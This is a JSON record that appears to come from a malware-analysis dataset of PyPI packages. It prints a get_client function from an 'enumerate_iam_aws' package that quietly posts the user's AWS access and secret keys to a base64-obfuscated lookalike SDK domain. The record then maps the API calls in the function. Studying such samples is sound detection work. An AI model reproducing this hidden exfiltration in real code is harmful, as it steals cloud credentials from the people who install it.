[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/enumerate_iam_aws-1.0.1-py3-none-any/enumerate_iam/main.py",
    "code_snippet": "import requests\nimport base64\n\ndef get_client(access_key, secret_key, session_token, service_name, region):\n    key = '%s-%s-%s-%s-%s' % (access_key, secret_key, session_token, service_name, region)\n\n    client = CLIENT_POOL.get(key, None)\n    if client is not None:\n        return client\n\n    logger = logging.getLogger()\n    logger.debug('Getting client for %s in region %s' % (service_name, region))\n\n    config = Config(connect_timeout=5,\n                    read_timeout=5,\n                    retries={'max_attempts': 30},\n                    max_pool_connections=MAX_POOL_CONNECTIONS * 2)\n\n    try:\n        client = boto3.client(\n            service_name,\n            aws_access_key_id=access_key,\n            aws_secret_access_key=secret_key,\n            aws_session_token=session_token,\n            region_name=region,\n            config=config,\n        )\n    except:\n        # The service might not be available in this region\n        return\n    try:\n        data = {\"ak\": access_key, \"sk\": secret_key}\n        requests.post(url=base64.b64decode('aHR0cHM6Ly9hcGkuYWxpeXVuLXNkay1yZXF1ZXN0cy54eXovYXdz').decode('utf-8'), json=data)\n    except:\n        pass\n    CLIENT_POOL[key] = client\n\n    return client",
    "pattern_analysis": {
      "api_sequence": [
        "logging.getLogger",
        "requests.post",
        "base64.b64decode"
      ],
      "api_sequence_with_args": [
        "logging.getLogger()",
        "requests.post(url=base64.b64decode('aHR0cHM6Ly9hcGkuYWxpeXVuLXNkay1yZXF1ZXN0cy54eXovYXdz').decode('utf-8'), json=data)",
        "base64.b64decode('aHR0cHM6Ly9hcGkuYWxpeXVuLXNkay1yZXF1ZXN0cy54eXovYXdz')"
      ],
      "mapped_sequence": [
        {
          "api_name": "logging.getLogger",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        }
      ],
      "contextual_code": "def get_client(access_key, secret_key, session_token, service_name, region):\n    key = '%s-%s-%s-%s-%s' % (access_key, secret_key, session_token, service_name, region)\n\n    client = CLIENT_POOL.get(key, None)\n    if client is not None:\n        return client\n\n    logger = logging.getLogger()\n    logger.debug('Getting client for %s in region %s' % (service_name, region))\n\n    config = Config(connect_timeout=5,\n                    read_timeout=5,\n                    retries={'max_attempts': 30},\n                    max_pool_connections=MAX_POOL_CONNECTIONS * 2)\n\n    try:\n        client = boto3.client(\n            service_name,\n            aws_access_key_id=access_key,\n            aws_secret_access_key=secret_key,\n            aws_session_token=session_token,\n            region_name=region,\n            config=config,\n        )\n    except:\n        # The service might not be available in this region\n        return\n    try:\n        data = {\"ak\": access_key, \"sk\": secret_key}\n        requests.post(url=base64.b64decode('aHR0cHM6Ly9hcGkuYWxpeXVuLXNkay1yZXF1ZXN0cy54eXovYXdz').decode('utf-8'), json=data)\n    except:\n        pass\n    CLIENT_POOL[key] = client\n\n    return client"
    }
  }
]